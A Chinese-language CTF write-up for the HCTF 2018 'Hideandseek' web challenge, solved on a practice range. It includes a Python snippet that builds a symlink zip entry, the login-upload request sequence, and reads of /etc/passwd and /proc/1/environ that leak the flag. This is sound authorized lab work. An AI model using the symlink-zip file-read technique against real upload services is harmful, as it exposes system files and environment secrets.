---
title: '[HCTF 2018] Hideandseek：zip symlink 任意文件读'
date: 2026-11-14 10:00:00
categories:
  - Web
tags:
  - Writeup
  - CTF
  - 任意文件读
  - Flask
  - 环境变量泄露
cover: /img/cover-default.webp
top_img: false
toc: true
---

> 结论先行：登录态的 `/upload` 会解压 zip 后 `cat` 解压产物并回显；zip 内的软链接条目未被过滤，可读取任意绝对路径。真 flag 在 PID 1 的 `/proc/1/environ`，`/proc/self/environ` 是诱饵。平台提交 `accepted:true, is_solved:true`。

## 结论

| 项 | 值 |
| --- | --- |
| 目标 | BUUCTF CTF2 实践靶场 `[HCTF 2018] Hideandseek`（WEB / Easy / 1 分） |
| 漏洞类型 | Zip symlink 任意文件读 + 环境变量泄露（非注入 / 非反序列化 / 非 getshell） |
| 状态 | **Confirmed** |
| Flag | `CTF2{3b741699-77a5-42f8-9adb-6f6c23dd5105}` |
| 置信度 | High（独立二次复现 + 平台 accepted） |

## 漏洞分析

### 登录态（Observed / Verified）

`POST /login` 对任意**非 `admin`** 用户名都放行，302 回 `/` 并下发 Flask signed cookie（`{"username":"test"}`）。`admin/admin` 被拒：`Location: /?error=1`，页面弹 `Sorry, you are not admin!`。

**这是误导**：本题不需要伪造 admin session，任意非 admin 账号即可拿到上传点。

### 上传点与 sink（Verified）

登录后首页出现 `POST /upload`（`multipart/form-data`，字段 `the_file`）。上传普通 zip（含 `hello.txt`）返回 `200`，正文原样回显文件内容。

**决定性证据**：用 symlink zip 读 `/proc/self/cmdline` 得到——

```
cat\x00./uploads/symlink.zip_/link\x00
```

即后端把上传的 zip 解压到 `./uploads/<zipname>_/`，再对解压出的文件执行 `cat` 并回显。软链接条目未被过滤，`cat` 会顺着链接读到任意路径。

### flag 位置（Verified）

真 flag 在 uWSGI 主进程（PID 1）的环境变量里——`/proc/1/environ` 含 `FLAG=CTF2{...}`。而 `/proc/self/environ`（执行 `cat` 的子进程）里是 `FLAG=not_flag`，是**诱饵**（子进程环境被覆盖）。因此读 `/proc/1/environ`，而非 `self`。

> 源码 `/app/app.py` 读取返回空（文件不在该路径），故具体后端代码 **Unknown**；但 `cat ./uploads/...` 的 `cmdline` 已足够确认 sink，无需源码即可复现。

## 复现步骤

### 1. 构造 symlink zip

```python
zi = zipfile.ZipInfo("link")
zi.create_system = 3                 # Unix
zi.external_attr = (0o120777 << 16)  # S_IFLNK | 0777
z.writestr(zi, "/proc/1/environ")    # 链接目标 = 要读的绝对路径
```

三要素缺一不可：`create_system=3`、软链接位 `external_attr`、`writestr` 写入链接目标。

### 2. 登录 → 上传 → 回显取 flag

```
1) POST /login   username=test&password=***  -> 302 /  Set-Cookie: session=...
2) POST /upload  [multipart: the_file=symlink.zip]  -> 200  正文 = /proc/1/environ 内容
3) 从响应提取 FLAG=CTF2{...}
```

### 3. 逐目标验证

| 目标 | 结果 |
|---|---|
| `/etc/passwd` | 200，完整 passwd（任意文件读成立） |
| `/proc/self/cmdline` | `cat\x00./uploads/symlink.zip_/link\x00`（确认 sink） |
| `/proc/self/environ` | `FLAG=not_flag`（诱饵） |
| `/proc/1/environ` | **`FLAG=CTF2{3b741699-77a5-42f8-9adb-6f6c23dd5105}`** |

### 4. 独立二次验证

换账号 `guest`、换链接名 `p`，仅针对 `/proc/1/environ` 重新构造上传，返回同一 flag，稳定 → **Confirmed**。

## 证据

| 证据 ID | 来源 | 观察 | 状态 |
| --- | --- | --- | --- |
| E1 | `POST /login` 响应 | 非 admin 账号 302 + signed cookie | Observed |
| E2 | `POST /upload` 普通 zip | 200 回显文件内容 | Observed |
| E3 | symlink zip → `/proc/self/cmdline` | `cat ./uploads/...` | Verified |
| E4 | symlink zip → `/proc/1/environ` | `FLAG=CTF2{...}` | Verified |
| E5 | `ctf2_submit_flag(confirmation:true)` | `accepted:true, is_solved:true, earned_points:1` | Verified |

## 与 2018 原始题解的交叉验证（差异说明）

委派 researcher 检索 4+ 篇 2018 原始赛题 writeup（含完整源码）。原始题与本练习场实例存在**部署差异**：

| 项 | 2018 原始题（多源一致 Confirmed） | 本 CTF2 实例（Observed / Verified） |
|---|---|---|
| 上传 sink | `unzip -n` 后 `cat <zip>_/*` 回显；内容含 `hctf` 则拒绝 | 相同（`cmdline` 佐证） |
| symlink 构造 | `external_attr = 2717843456` | `(0o120777 << 16)` = **2717843456**，与公开值完全一致 |
| flag 位置 | `flag.py`，需复算 `SECRET_KEY` 伪造 admin session | **`/proc/1/environ` 的 `FLAG`**；`self` 为诱饵 |
| 完整链 | 读 MAC → `random.seed(uuid.getnode())` → 复算 key → 伪造 session | 直接读 `/proc/1/environ`，无需伪造 session |

差异原因（**Inferred**）：CTF2 练习场以「每位选手独立 flag」重建靶机，flag 作为环境变量注入 PID 1，因此无需复刻原始题的 session 伪造链。

**决定性验证**：平台 `accepted:true`。公开题解是线索而非本实例证明，以靶机实际响应与平台 accepted 为准。

公开来源：<https://www.anquanke.com/post/id/163975> · <https://rmb122.com/2018/11/12/hctf2018-writeup> · <https://www.kingkk.com/2018/11/hctf2018-web-writeup> · <https://igml.top/2018/11/13/2018-HCTF>

## 限制与未验证项

- Unknown：后端具体源码（`/app/app.py` 读不到），但不影响结论。
- 靶机环境解题后已销毁，`access_url` 不再可用。
- 结论仅针对本 CTF2 实例；原始 2018 赛题路径不同（见上）。

## 小结

1. **先确认 sink 再打**：普通 zip 回显 + `/proc/self/cmdline` 两步证明「解压后 cat」，避免盲目构造。
2. **`/proc/self` vs `/proc/1`**：`cat` 是子进程，其 `FLAG` 常被覆盖成诱饵；两处都读并对照。
3. **不被 admin 误导**：登录框的 `Sorry, you are not admin!` 不是屏障。
4. **正规流程**：`whoami → list → get → log(plan) → start → get(access_ready) → 解题 → log(finding) → submit → log(result) → delete_env`。

> 仅记录授权环境下的靶场研究。原始请求序列、curl 命令与完整 exp 见本地 WP 归档 `payload` 文件。
